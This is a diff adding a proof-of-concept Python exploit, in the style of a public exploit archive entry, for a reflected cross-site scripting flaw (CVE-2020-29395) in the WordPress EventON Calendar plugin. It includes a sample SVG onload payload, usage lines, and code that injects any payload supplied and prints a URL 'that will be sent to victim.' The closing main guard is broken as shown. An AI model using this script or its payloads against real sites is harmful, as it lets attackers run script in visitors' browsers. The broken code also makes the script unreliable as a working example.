@@ -1,0 +1,80 @@
+# Exploit Title: Wordpress Plugin EventON Calendar 3.0.5 - Reflected Cross-Site Scripting
+# Date: 27.11.2020
+# Exploit Author: b3kc4t (Mustafa GUNDOGDU)
+# Vendor Homepage: https://www.myeventon.com/
+# Version: 3.0.5
+# Tested on: Ubuntu 18.04
+# CVE : 2020-29395
+# Description Link:
+https://github.com/mustgundogdu/Research/tree/main/EventON_PLUGIN_XSS
+
+"""
+                 ~ VULNERABLITY DETAILS ~
+    
+    https://target/addons/?q=<svg/onload=alert(/b3kc4t/)>
+    
+    #
+    WordPress sites that use EventOn Calendar cause reflected xss vulnerability to javascript payloads injected 
+    into the search field.
+    
+    #
+    The following python code will inject javascript code and print out url that will be sent to victim. 
+    If you use unicode caracters for xss , exploit will print page source.
+
+    ##USAGE##
+    
+    $ sudo python eventon_exploit.py --exploit --url https://target/addons/?q= --payload '<svg/onload=alert(/b3kc4t/)>'
+
+    ##OUTPUT##
+
+    [+] https://target/addons/?q=<svg/onload=alert(/b3kc4t/)>
+
+
+"""
+import requests
+import sys
+import argparse
+from colorama import Fore
+        
+def vuln_reflected(url, payload):
+
+    s = requests.Session()
+    get_request = s.get(url+payload)
+    
+    if get_request.status_code == 500:
+        print(Fore.GREEN+"[-] COULD BE WAF, NOT BE REALIZED XSS INJECTION [-]")
+
+    else:
+        content_result = str(get_request.content)
+        search_find = content_result.find(payload)
+
+        if search_find != -1:
+            print(Fore.GREEN+"[+] "+str(url)+str(payload))
+
+        else:
+
+            print(content_result)
+
+
+def main():
+
+    desc = "Wordpress EventON Calendar Plugin XSS"
+    parser = argparse.ArgumentParser(description=desc)
+    exp_option = parser.add_argument_group('')
+    parser.add_argument("--exploit", help ="", action='store_true')
+    parser.add_argument("--url",help="", type=str, required=False)
+    parser.add_argument("--payload",help="",type=str,required=False)
+
+    args = parser.parse_args()
+
+    if args.exploit:
+
+        if args.url:
+
+            if args.payload:
+                url = args.url
+                payload = args.payload
+                vuln_reflected(url, payload)
+
+if name == 'main':
+    main()
